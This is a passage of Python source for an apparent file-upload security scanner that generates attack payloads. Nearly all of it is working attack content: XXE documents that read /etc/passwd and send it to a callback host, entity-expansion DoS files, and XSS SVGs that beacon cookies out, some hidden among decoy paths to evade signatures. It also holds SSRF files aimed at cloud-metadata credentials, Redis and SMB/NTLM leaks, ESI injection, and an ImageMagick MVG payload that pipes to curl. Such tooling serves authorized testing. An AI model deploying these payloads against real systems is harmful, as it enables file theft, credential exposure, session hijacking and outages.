                   f'  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
                   f'\'file:///nonexistent/%file;\'>">\n  %eval;\n  %error;\n]>\n'
                   f'<r>trigger</r>').encode()
    # OOB exfil via php://filter base64 (ssrf_orwa.xml): base64 keeps the file bytes
    # intact as a single URL query param to the OAST callback.
    oob_phpfilter = (f'<?xml version="1.0"?>\n<!DOCTYPE foo [\n'
                     f'<!ENTITY % data SYSTEM '
                     f'"php://filter/convert.base64-encode/resource={LF_PASSWD}">\n'
                     f'<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM '
                     f'\'http://{OAST}/xxe/{p}?d=%data;\'>">\n%param1;\n%exfil;\n]>\n'
                     f'<r>trigger</r>').encode()
    # SVG XXE technique set (synced from UpMap mod_xxe_svg): classic entity,
    # XInclude, parameter-entity OOB, external DTD, param+DTD, direct callback,
    # xml-stylesheet, schemaLocation, hostname-exfil.
    svg = (f'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
           f'"file://{LF_PASSWD}">]><svg xmlns="http://www.w3.org/2000/svg">'
           f'<text>&xxe;</text></svg>').encode()
    svg_xinclude = (f'<svg xmlns="http://www.w3.org/2000/svg" '
                    f'xmlns:xi="http://www.w3.org/2001/XInclude">'
                    f'<xi:include href="file://{LF_PASSWD}" parse="text"/></svg>').encode()
    # Standalone parameter-entity eval chain (was a malformed/incomplete entity here —
    # corrected to the real %file;->%eval;->&xxe; chain, synced from UpMap).
    svg_paramentity = (f'<?xml version="1.0"?>\n<!DOCTYPE foo [\n'
                       f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
                       f'  <!ENTITY % eval "<!ENTITY xxe \'%file;\'>">\n  %eval;\n]>\n'
                       f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>').encode()
    # In-band /etc/hostname (host_getter.svg).
    svg_hostname = (f'<?xml version="1.0" standalone="yes"?>\n'
                    f'<!DOCTYPE test [<!ENTITY xxe SYSTEM "file://{LF_HOSTNAME}">]>\n'
                    f'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" '
                    f'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
                    f'<text font-size="16" x="0" y="16">&xxe;</text></svg>').encode()
    # Combined XXE + SSRF in one file (img_ssrf.svg): a param-entity OOB chain AND an
    # <image href=OAST> SSRF callback — one file exercises both vectors.
    svg_combined = (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE svg [\n'
                    f'  <!ENTITY % file SYSTEM "file://{LF_PASSWD}">\n'
                    f'  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
                    f'\'http://{OAST}/xxe/{p}?p=%file;\'>">\n  %eval;\n  %exfil;\n]>\n'
                    f'<svg xmlns="http://www.w3.org/2000/svg" '
                    f'xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
                    f'  <image height="30" width="30" xlink:href="http://{OAST}/svg-image/{p}"/>\n'
                    f'  <text x="0" y="20" font-size="20">trigger</text>\n'
                    f'</svg>').encode()
    svg_extdtd = (f'<?xml version="1.0"?>\n'
                  f'<!DOCTYPE foo PUBLIC "-//A/B/EN" "http://{OAST}/xxe/{p}.dtd">\n'
                  f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>').encode()
    svg_paramdtd = (f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE foo [ <!ENTITY % other SYSTEM "http://{OAST}/xxe/{p}"> %other; ]>\n'
                    f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>').encode()
    svg_callback = (f'<?xml version="1.0" standalone="yes"?>\n'
                    f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{OAST}/xxe/{p}">]>\n'
                    f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>').encode()
    svg_stylesheet = (f'<?xml version="1.0"?>\n'
                      f'<?xml-stylesheet type="text/xml" href="http://{OAST}/xxe/{p}.xsl"?>\n'
                      f'<svg xmlns="http://www.w3.org/2000/svg"><text>trigger</text></svg>').encode()
    svg_schemaloc = (f'<svg xmlns="http://www.w3.org/2000/svg" '
                     f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
                     f'xsi:schemaLocation="http://{OAST}/xxe/{p} http://{OAST}/xxe/{p}.xsd">'
                     f'<text>trigger</text></svg>').encode()
    svg_hostexfil = (f'<?xml version="1.0" standalone="yes"?>'
                     f'<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://{OAST}/xxe/host/{p}">]>'
                     f'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg" '
                     f'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">'
                     f'<text font-size="16" x="0" y="16">&xxe;</text></svg>').encode()
    xmp = (b'<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?>\n'
           b'<?xml version="1.0" encoding="UTF-8"?>\n'
           b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://' + LF_PASSWD.encode() + b'">]>\n'
           b'<x:xmpmeta xmlns:x="adobe:ns:meta/">\n'
           b'  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">\n'
           b'    <rdf:Description>&xxe;</rdf:Description>\n'
           b'  </rdf:RDF>\n</x:xmpmeta>\n<?xpacket end="w"?>')

    # ── New XXE technique classes (from the XXE cheatsheets in this idea folder) ──
    def _doc(uri):
        return ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]>'
                '<foo>&xxe;</foo>' % uri).encode()
    billion = (b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
               b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
               b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
               b'<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">'
               b'<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">'
               b'<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">'
               b'<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">'
               b'<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">'
               b'<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]>'
               b'<lolz>&lol9;</lolz>')
    quadratic = (b'<?xml version="1.0"?><!DOCTYPE k [<!ENTITY a "' + b"a" * 1000
                 + b'">]><k>' + b"&a;" * 1000 + b'</k>')
    # Local-DTD reuse (error-based, no outbound — abuses a DTD present on the host).
    # The local DTD path (fonts.dtd) is the *trigger*, not the read target; only
    # the inner SYSTEM file URI is routed through _lfi().
    local_dtd = (f'<?xml version="1.0"?><!DOCTYPE foo ['
                 f'<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">'
                 f'<!ENTITY % expr \'aaa)><!ENTITY xxe SYSTEM "file://{LF_PASSWD}">'
                 f'<!ELEMENT aa (bb\'>%local_dtd;]><foo>&xxe;</foo>').encode()
    # UTF-7 encoded entity doc (encoding-based WAF bypass). The file path sits
    # inside UTF-7 plain-ASCII between +ACI- markers, so substitution is direct.
    utf7 = (f'<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo+AFs '
            f'+ADwAIQ-ENTITY xxe SYSTEM +ACI-file://{LF_PASSWD}+ACI +AD4AXQB'
            f'+ADw-foo+AD4AJg-xxe;+ADw-/foo+AD4-').encode()

    return [
        ("xxe", classic, ["xml"]),
        ("xxe", win, ["xml"]),
        ("xxe_hostname", hostname, ["xml"]),
        ("xxe_hosts", hosts, ["xml"]),
        ("xxe_phpfilter_base64", phpfilter_b64, ["xml"]),
        ("xxe_phpfilter_rot13", phpfilter_rot13, ["xml"]),
        ("xxe_evalchain", evalchain, ["xml"]),
        ("xxe_error_based", error_based, ["xml"]),
        ("xxe_oob", oob, ["xml"]),
        ("xxe_oob_phpfilter", oob_phpfilter, ["xml"]),
        ("xxe_svg", svg, ["svg"]),
        ("xxe_svg_xinclude", svg_xinclude, ["svg"]),
        ("xxe_svg_paramentity", svg_paramentity, ["svg"]),
        ("xxe_svg_hostname", svg_hostname, ["svg"]),
        ("xxe_svg_combined", svg_combined, ["svg"]),
        ("xxe_svg_extdtd", svg_extdtd, ["svg"]),
        ("xxe_svg_paramdtd", svg_paramdtd, ["svg"]),
        ("xxe_svg_callback", svg_callback, ["svg"]),
        ("xxe_svg_stylesheet", svg_stylesheet, ["svg"]),
        ("xxe_svg_schemaloc", svg_schemaloc, ["svg"]),
        ("xxe_svg_hostexfil", svg_hostexfil, ["svg"]),
        ("xxe_xmp", xmp, ["xmp"]),
        # XMP-XXE embedded inside a real image (UpMap mod_xxe_xmp).
        ("xxe_xmp_jpg", MAGIC["jpg"] + b"\n" + xmp, ["jpg"]),
        ("xxe_xmp_png", MAGIC["png"] + b"\n" + xmp, ["png"]),
        ("xxe_docx", _docx_xxe(), ["docx"]),
        # XLSX OOXML container (spreadsheet parser / WPS Office — xlsx_xxe_wps sample).
        ("xxe_xlsx", _xlsx_xxe(), ["xlsx"]),
        # expect:// wrapper — XXE -> RCE when PHP's expect extension is loaded.
        ("xxe_expect", _doc("expect://id"), ["xml"]),
        # Protocol-scheme rotation (SSRF / Java-specific / service probes).
        ("xxe_proto_jar",    _doc(f"jar:http://{OAST}/x.jar!/f"), ["xml"]),
        ("xxe_proto_netdoc", _doc(f"netdoc:{LF_PASSWD}"), ["xml"]),
        ("xxe_proto_gopher", _doc("gopher://127.0.0.1:6379/_INFO"), ["xml"]),
        ("xxe_proto_dict",   _doc("dict://127.0.0.1:11211/stat"), ["xml"]),
        ("xxe_proto_ftp",    _doc(f"ftp://{OAST}/f"), ["xml"]),
        ("xxe_proto_smtp",   _doc(f"smtp://{OAST}:25/x"), ["xml"]),
        ("xxe_proto_ldap",   _doc(f"ldap://{OAST}:389/x"), ["xml"]),
        ("xxe_proto_data",   _doc("data://text/plain;base64,SGVsbG8="), ["xml"]),
        # Local-DTD reuse (error-based, no outbound needed).
        ("xxe_local_dtd", local_dtd, ["xml"]),
        # External / combined internal+external subset DOCTYPE.
        ("xxe_external_subset", (f'<?xml version="1.0"?><!DOCTYPE foo SYSTEM '
                                 f'"http://{OAST}/evil.dtd"><foo>&xxe;</foo>').encode(), ["xml"]),
        ("xxe_combined_subset", (f'<?xml version="1.0"?><!DOCTYPE foo SYSTEM '
                                 f'"http://{OAST}/evil.dtd" [<!ENTITY xxe SYSTEM '
                                 f'"file://{LF_PASSWD}">]><foo>&xxe;</foo>').encode(), ["xml"]),
        # XSLT document() file read.
        ("xxe_xslt", (f'<?xml version="1.0"?><xsl:stylesheet xmlns:xsl='
                      f'"http://www.w3.org/1999/XSL/Transform" version="1.0">'
                      f'<xsl:template match="/"><xsl:value-of '
                      f'select="document(\'file://{LF_PASSWD}\')"/></xsl:template>'
                      f'</xsl:stylesheet>').encode(), ["xsl", "xml"]),
        # Encoding WAF bypass (UTF-7 entity doc).
        ("xxe_utf7", utf7, ["xml"]),
        # Filter-bypass entity targets: null byte / URL-encode / double-encode / char-ref.
        # Encoders applied to whichever path wins (default OR --file-read override).
        ("xxe_bypass_nullbyte",  _doc(f"file://{LF_PASSWD}%00"), ["xml"]),
        ("xxe_bypass_urlenc",    _doc(f"file://{_lfi_urlenc('/etc/passwd')}"), ["xml"]),
        ("xxe_bypass_doubleenc", _doc(f"file://{_lfi_urlenc('/etc/passwd', 2)}"), ["xml"]),
        ("xxe_bypass_charref", (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe '
                                f'SYSTEM "file://{_lfi_charref("/etc/passwd")}">]>'
                                f'<foo>&xxe;</foo>').encode(), ["xml"]),
        # New entity containers: RSS feed, sitemap, HTML, plain TXT.
        ("xxe_rss", (f'<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM '
                     f'"file://{LF_PASSWD}">]><rss version="2.0"><channel>'
                     f'<title>&xxe;</title></channel></rss>').encode(), ["rss", "xml"]),
        ("xxe_sitemap", (f'<?xml version="1.0"?><!DOCTYPE urlset [<!ENTITY xxe SYSTEM '
                         f'"file://{LF_PASSWD}">]><urlset xmlns="http://www.sitemaps.org'
                         f'/schemas/sitemap/0.9"><url><loc>&xxe;</loc></url></urlset>'
                         ).encode(), ["xml"]),
        ("xxe_html", (f'<!DOCTYPE html [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>'
                      f'<html><body>&xxe;</body></html>').encode(), ["html"]),
        ("xxe_txt", (f'<!DOCTYPE txt [<!ENTITY xxe SYSTEM "file://{LF_PASSWD}">]>'
                     f'&xxe;').encode(), ["txt"]),
        # Entity-expansion / blocking-read DoS.
        ("xxe_dos_billion", billion, ["xml"]),
        ("xxe_dos_quadratic", quadratic, ["xml"]),
        ("xxe_dos_devrandom", _doc("file:///dev/random"), ["xml"]),
    ]


# JavaScript execution sinks rotated through the XSS payloads (synced from UpMap).
# Using only alert() lets WAFs/CSP rules pattern-match the literal "alert(";
# rotating the sink keeps proof-of-execution while dodging that signature.
JS_SINKS = ["alert", "prompt", "confirm", "console.log", "document.write"]


def _decoy_svg(onload_js, n=300):
    """Synthesize a 'steganographic' SVG (synced from UpMap): a large, real-looking
    vector image (n random decoy <path> elements) carrying a single onload= XSS
    trigger on the root <svg>. Mirrors the disguised cookie_stealer.svg/coffinxss.svg
    corpus files without shipping a fixed multi-hundred-KB blob — generated fresh
    each run so the decoy geometry isn't statically signaturable. onload_js must be
    pre-escaped for an XML double-quoted attribute (no raw double quotes)."""
    paths = []
    for _ in range(max(1, n)):
        d = "M{} {} ".format(random.randint(0, 2560), random.randint(0, 1600))
        d += " ".join(
            "{} {} {}".format(random.choice("LQTlqt"),
                              random.randint(-40, 2600), random.randint(-40, 1640))
            for _ in range(random.randint(3, 9)))
        paths.append(f'<path d="{d}" fill="#{random.randint(0, 0xFFFFFF):06x}" stroke="none"/>')
    svg = (
        '<?xml version="1.0" standalone="no"?>\n'
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.0//EN" '
        '"http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">\n'
        '<svg version="1.0" xmlns="http://www.w3.org/2000/svg" '
        'width="2560pt" height="1600pt" viewBox="0 0 2560 1600" '
        f'preserveAspectRatio="xMidYMid meet" onload="{onload_js}">\n'
        '<g transform="translate(0,1600) scale(0.1,-0.1)" fill="#000000" stroke="none">\n'
        + "\n".join(paths) +
        '\n</g>\n</svg>\n'
    )
    return svg.encode()


def gen_xss(_lang):
    p = PROBE
    out = []
    # #2 sink rotation (synced from UpMap mod_xss_svg): each SVG shape — onload,
    # <script>, foreignObject<script>, animate onbegin — emitted per JS sink.
    for sink in JS_SINKS:
        call = f"{sink}('{p}')"
        out += [
            ("xss_svg", (f'<svg xmlns="http://www.w3.org/2000/svg" onload="{call}">'
                         f'<rect width="100" height="100"/></svg>').encode(), ["svg"]),
            ("xss_svg", (f'<svg xmlns="http://www.w3.org/2000/svg"><script>{call}'
                         f'</script></svg>').encode(), ["svg"]),
            ("xss_svg_foreignobject",
             (f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
              f'<foreignObject><script xmlns="http://www.w3.org/1999/xhtml">'
              f'{call}</script></foreignObject></svg>').encode(), ["svg"]),
            ("xss_svg_animate",
             (f'<svg xmlns="http://www.w3.org/2000/svg">'
              f'<animate onbegin="{call}" attributeName="x" dur="1s"/></svg>').encode(), ["svg"]),
        ]
    # Full domain+cookie readout (polygon-disguised, RootSploit.svg shape).
    svg_domain = (f'<?xml version="1.0" standalone="no"?>'
                  f'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
                  f'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
                  f'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" '
                  f'width="1500" height="1500">'
                  f'<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>'
                  f'<script>alert(\'{p}\'+"\\n"+document.domain+"\\n"+document.cookie)</script>'
                  f'</svg>')
    out.append(("xss_svg_domain_cookie", svg_domain.encode(), ["svg"]))
    # #3 OAST cookie-exfil chain: beacon document.domain+cookie to the OAST host,
    # then redirect there (never a third-party domain).
    exfil_js = (f"new Image().src='http://{OAST}/xss/{p}?d='+encodeURIComponent("
                f"document.domain+'|'+document.cookie);"
                f"location.href='http://{OAST}/xss-land/{p}';")
    out.append(("xss_svg_exfil",
                (f'<svg xmlns="http://www.w3.org/2000/svg"><script>{exfil_js}</script>'
                 f'</svg>').encode(), ["svg"]))
    # #1 steganographic carriers: the trigger rides on the root <svg onload=>,
    # buried in hundreds of decoy vector paths so the file renders as real art.
    out.append(("xss_svg_stego", _decoy_svg("prompt(document.cookie)"), ["svg"]))
    out.append(("xss_svg_stego", _decoy_svg(exfil_js), ["svg"]))
    # HTML XSS (UpMap mod_xss_html): one <script> body per sink + classics.
    html_exts = ["html", "htm", "xhtml"]
    for sink in JS_SINKS:
        out.append(("xss_html",
                    (f'<html><body><script>{sink}(\'{p}\')</script></body></html>').encode(),
                    html_exts))
    out += [
        ("xss_html", (f'<img src=x onerror="prompt(\'{p}\')">').encode(), html_exts),
        ("xss_html", (f'<script>confirm("{p}")</script>').encode(), html_exts),
        ("xss_html", (f'<!DOCTYPE html><html><script>alert("{p}")</script></html>').encode(),
         html_exts),
    ]
    # Polyglots: GIF89a-magic + HTML body (sniffer sees GIF, browser renders script),
    # and the classic /*</style></script><script> comment polyglot (CSP/sniff bypass).
    js_chunk   = f'/*</style></script><script>alert("{p}")</script>'.encode()
    gif_script = b"GIF89a" + f'<script>alert("{p}")</script>'.encode()
    gif_img    = b"GIF89a" + f'<img src=x onerror=alert("{p}")>'.encode()
    out += [
        ("xss_polyglot", MAGIC["gif"] + f'<script>alert("{p}")</script>'.encode(),
         ["gif", "jpg"]),
        ("xss_polyglot_comment", MAGIC["jpg"] + js_chunk, ["jpg", "png", "gif"]),
        ("xss_polyglot", gif_script, ["gif", "png", "svg"]),
        ("xss_polyglot", gif_img,    ["gif", "png", "svg"]),
        # Compiled SWF Flash XSS (ExternalInterface.call("alert",…)) — legacy-browser
        # stored XSS (UploadScanner SWF_TYPES). Also as an image-ext content sniff.
        ("xss_swf", SWF_XSS, ["swf", "jpg"]),
    ]
    return out


def _svg_ssrf_payloads():
    """SVG SSRF — 18 distinct element/attribute vectors that make a server-side SVG
    renderer fetch a URL, including a UNC/SMB path for NTLM-hash leaks. Synced
    byte-for-byte from UpMap mod_svg_ssrf. Returns [(label, svg_bytes), …]."""
    p = PROBE
    host = OAST.split("://")[-1].split("/")[0]
    url_fe = _cb(f"svg-feImage/{p}")
    url_fi = _cb(f"svg-fo-iframe/{p}")
    url_fm = _cb(f"svg-fo-img/{p}")
    url_ih = _cb(f"svg-image-href/{p}")
    url_ix = _cb(f"svg-image-xlink/{p}")
    url_lk = _cb(f"svg-link/{p}")
    url_pf = _cb(f"svg-path-fill/{p}")
    url_pi = _cb(f"svg-pattern-img/{p}")
    url_rf = _cb(f"svg-rect-fill/{p}")
    url_ff = _cb(f"svg-font-face/{p}")
    url_si = _cb(f"svg-cdata-import/{p}")
    url_sp = _cb(f"svg-plain-import/{p}")
    url_tp = _cb(f"svg-textPath/{p}")
    url_tr = _cb(f"svg-tref/{p}")
    url_us = _cb(f"svg-use/{p}")
    url_xi = _cb(f"svg-xi-include/{p}")
    url_xs = _cb(f"svg-xml-stylesheet/{p}")
    return [
        ("feImage_xlink_href", (
            f'<?xml version="1.0" encoding="UTF-8"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <feImage xlink:href="{url_fe}" width="200" height="200"/>\n'
            f'</svg>'
        ).encode()),
        ("foreignObject_iframe", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">\n'
            f'  <foreignObject width="1000" height="1000">\n'
            f'    <iframe xmlns="http://www.w3.org/1999/xhtml" src="{url_fi}"></iframe>\n'
            f'  </foreignObject>\n'
            f'</svg>'
        ).encode()),
        ("foreignObject_img", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <foreignObject width="100" height="100">\n'
            f'    <img xmlns="http://www.w3.org/1999/xhtml" src="{url_fm}"/>\n'
            f'  </foreignObject>\n'
            f'</svg>'
        ).encode()),
        ("image_href_svg2", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <image href="{url_ih}" height="100" width="100"/>\n'
            f'</svg>'
        ).encode()),
        ("image_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <image height="30" width="30" xlink:href="{url_ix}"/>\n'
            f'</svg>'
        ).encode()),
        ("link_stylesheet", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg">\n'
            f'  <link xmlns="http://www.w3.org/1999/xhtml" rel="stylesheet" href="{url_lk}" type="text/css"/>\n'
            f'  <rect x="0" y="150" height="10" width="300" style="fill: black"/>\n'
            f'</svg>'
        ).encode()),
        ("path_fill_url", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n'
            f'  <path fill="url({url_pf})" stroke="#a1a1a1"/>\n'
            f'</svg>'
        ).encode()),
        ("pattern_image_xlink", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n'
            f'  <defs>\n'
            f'    <pattern id="exfil" width="512" height="512" patternUnits="userSpaceOnUse">\n'
            f'      <image xlink:href="{url_pi}" x="0" y="0" height="256" width="256"/>\n'
            f'    </pattern>\n'
            f'  </defs>\n'
            f'</svg>'
        ).encode()),
        ("rect_fill_url", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <rect fill="url({url_rf})"/>\n'
            f'</svg>'
        ).encode()),
        ("rect_fill_smb_unc", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <rect fill="url(\\\\{host}\\{p}\\smbshare\\)"/>\n'
            f'</svg>'
        ).encode()),
        ("style_cdata_font_face", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <defs>\n'
            f'    <style type="text/css">\n'
            f'      <![CDATA[\n'
            f'        @font-face {{ font-family: pwn; src: url(\'{url_ff}\'); }}\n'
            f'      ]]>\n'
            f'    </style>\n'
            f'  </defs>\n'
            f'  <text x="100" y="100" style="font-family: \'pwn\';">SSRF</text>\n'
            f'</svg>'
        ).encode()),
        ("style_cdata_import", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <defs>\n'
            f'    <style type="text/css">\n'
            f'      <![CDATA[\n'
            f'        @import url("{url_si}");\n'
            f'        rect {{ fill: red; }}\n'
            f'      ]]>\n'
            f'    </style>\n'
            f'  </defs>\n'
            f'  <rect x="200" y="100" width="600" height="300"/>\n'
            f'</svg>'
        ).encode()),
        ("style_plain_import", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
            f'  <style>@import url("{url_sp}");</style>\n'
            f'  <rect/>\n'
            f'</svg>'
        ).encode()),
        ("textPath_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <path id="MyPath" fill="none" stroke="red" d="M10,90 Q90,90 90,45"/>\n'
            f'  <text><textPath xlink:href="{url_tp}"></textPath></text>\n'
            f'</svg>'
        ).encode()),
        ("tref_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <text x="100" y="200" font-size="45" fill="red">\n'
            f'    <tref xlink:href="{url_tr}"/>\n'
            f'  </text>\n'
            f'</svg>'
        ).encode()),
        ("use_xlink_href", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">\n'
            f'  <use xlink:href="{url_us}" width="64" height="64"/>\n'
            f'</svg>'
        ).encode()),
        ("xi_include", (
            f'<?xml version="1.0"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude" width="200" height="200">\n'
            f'  <text x="10" y="10"><xi:include href="{url_xi}" parse="text"/></text>\n'
            f'</svg>'
        ).encode()),
        ("xml_stylesheet_pi", (
            f'<?xml version="1.0"?>\n'
            f'<?xml-stylesheet type="text/css" href="{url_xs}"?>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">\n'
            f'  <rect x="0" y="150" height="10" width="300" style="fill: black"/>\n'
            f'</svg>'
        ).encode()),
    ]


def gen_ssrf(_lang):
    host = OAST.split("://")[-1].split("/")[0]
    svg = (f'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org'
           f'/1999/xlink"><image xlink:href="http://{OAST}/svg" height="1" '
           f'width="1"/></svg>')
    m3u = (f'#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-KEY:METHOD=AES-128,'
           f'URI="http://{OAST}/k"\n#EXTINF:1,\nhttp://{OAST}/s.ts\n')
    # SSRF via URL/protocol injection as file content (synced from UpMap mod_ssrf_url):
    # OAST callback, cloud metadata (AWS/GCP), file://, dict:///gopher:// (Redis),
    # localhost services.
    proto_urls = [
        f"http://{OAST}/{PROBE}",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        f"file://{_lfi('/etc/passwd')}",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_QUIT%0a",
        "http://localhost:22",
        "http://127.0.0.1:8080/",
    ]
    # Windows .URL Internet Shortcut — IconFile UNC triggers an SMB/NTLM callback
    # (synced from UpMap mod_url_file_ssrf; .ini/.inf live in gen_csv).
    url_shortcut = (f"[InternetShortcut]\nURL=http://{OAST}/{PROBE}\n"
                    f"IconFile=\\\\{host}\\{PROBE}\\icon.ico\nIconIndex=1\n")
    out = [
        ("ssrf_svg", svg.encode(), ["svg"]),
        ("ssrf_m3u", m3u.encode(), ["m3u8", "m3u"]),
        ("ssrf_url_shortcut", url_shortcut.encode(), ["url"]),
    ]
    for u in proto_urls:
        out.append(("ssrf_proto", u.encode(), ["txt", "url", "ini"]))
    # 18 SVG render-SSRF vectors synced from UpMap mod_svg_ssrf.
    for label, content in _svg_ssrf_payloads():
        out.append(("svg_ssrf_" + label, content, ["svg"]))
    return out


def gen_esi(_lang):
    # ESI injection set synced from UpMap mod_esi_injection: passive split-string
    # detection (<!--esi--> stripped -> halves concatenate), esi:include OAST,
    # SSRF targets (AWS/GCP metadata, file://), and esi:vars / esi:remove.
    a = "".join(random.choices(string.ascii_letters, k=5))
    b = "".join(random.choices(string.ascii_letters, k=5))
    c = "".join(random.choices(string.ascii_letters, k=5))
    payloads = [
        ("esi_passive", f"{a}<!--esi-->{b}<!--esx-->{c}".encode()),
        ("esi", f'<esi:include src="http://{OAST}/esi/{PROBE}" '
                f'alt="http://{OAST}/esi/{PROBE}" onerror="continue"/>'.encode()),
        ("esi", f'<esi:include src="http://{OAST}/esi/{PROBE}"/>'.encode()),
        ("esi_ssrf", b'<esi:include src="http://169.254.169.254/latest/meta-data/"/>'),
        ("esi_ssrf", b'<esi:include src="http://metadata.google.internal/computeMetadata/v1/"/>'),
        ("esi_lfi", f'<esi:include src="file://{_lfi("/etc/passwd")}"/>'.encode()),
        ("esi_vars", b'<esi:vars/>'),
        ("esi_remove", b'<esi:remove>should be removed</esi:remove>kept content'),
    ]
    return [(label, p, ["html", "xml", "txt"]) for label, p in payloads]


def gen_images(_lang):
    cb = _cb(PROBE)
    mvg_rce = (b"push graphic-context\nviewbox 0 0 640 480\n"
               b"fill 'url(https://127.0.0.1/\"|curl " + cb.encode() + b"\")'\n"
               b"pop graphic-context\n")
    mvg_over = (b"push graphic-context\nencoding \"UTF-8\"\nviewbox 0 0 1 1\n"
                b"image Over 0,0 1,1 '" + cb.encode() + b"'\npop graphic-context\n")
    mvg_sleep = (b"push graphic-context\nviewbox 0 0 640 480\n"
